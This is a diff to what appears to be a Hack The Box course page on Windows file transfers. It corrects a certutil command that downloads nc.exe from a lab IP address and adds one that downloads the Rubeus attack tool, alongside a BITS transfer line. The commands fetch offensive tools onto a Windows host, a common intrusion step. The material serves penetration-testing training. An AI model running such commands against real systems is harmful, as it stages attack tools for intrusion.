@@ -95,5 +95,9 @@ PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.
 Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files.
 #### Download a File with Certutil
 ```cmd-session
-C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe nc.exe
+
+OR
+
+C:\htb> certutil.exe -urlcache -f http://10.10.14.170:8001/Rubeus.exe Rubeus.exe
 ```
